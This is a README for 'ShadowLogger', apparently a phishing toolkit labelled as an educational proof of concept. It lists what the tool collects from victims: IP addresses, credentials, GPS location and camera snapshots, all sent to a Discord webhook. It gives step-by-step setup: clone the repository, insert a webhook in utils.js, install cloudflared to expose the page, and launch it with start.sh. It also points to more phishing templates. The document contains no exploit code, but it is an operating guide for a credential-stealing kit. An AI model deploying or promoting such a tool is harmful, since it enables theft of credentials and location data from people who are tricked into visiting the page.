# ShadowLogger

> [!IMPORTANT]
> This tool is a Proof of Concept and is for Educational Purposes Only.
> Using this tool, you can find out what information a malicious website can gather about you and your devices and why you shouldn't click on random links or grant permissions like Location to them.

> [!CAUTION] 
> **Please use this responsibly and ethically.**
> DISCLAIMER
> It is possible to use ShadowLogger for nefarious purposes. It merely illustrates what adept attackers are capable of. Defenders have a responsibility to consider such attacks and protect their users from them. Using ShadowLogger should only be done with the written permission of the targeted parties for legitimate penetration testing assignments.

## Overview
ShadowLogger is an educational project that has the capabiliy of adding multiple phishing pages but only host one at a time. It captures IP addresses, credentials, location and snapshot and sends it to a webhook.

## Key features
- Collects IP address
- Collects credentials
- Collects GPS
- Collects snapshots from camera
- Has capability of adding phishing page templates
- Reports information to a discord webhook

## Setup

### 1. Clone the repository
```bash
git clone https://github.com/ARMed0ps/ShadowLogger.git
cd ShadowLogger
```
### 2. Edit files
```bash
* edit lines 41, 86, 170, 228 in utils.js to your discord webhook
```
### 3. Install dependencies
**3.1. python3**
```bash
sudo apt update
sudo apt install python3 python3-pip
```
**3.2. Cloudflared**
```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```
### 4. Temporarily bring the login page up
```bash
bash start.sh
```

## Pre-made phishing pages
I have more templates at https://github.com/armageddon-1/ShadowLogger-templates

## Adding custom phishing page templates
### 1. Upload folder of login page to the templates folder
### 2. Create 'config.ini' in the folder of the login page
### 3. Edit config.ini
Append the following line to the file:
```
[meta]
name="name"
description="description'
```

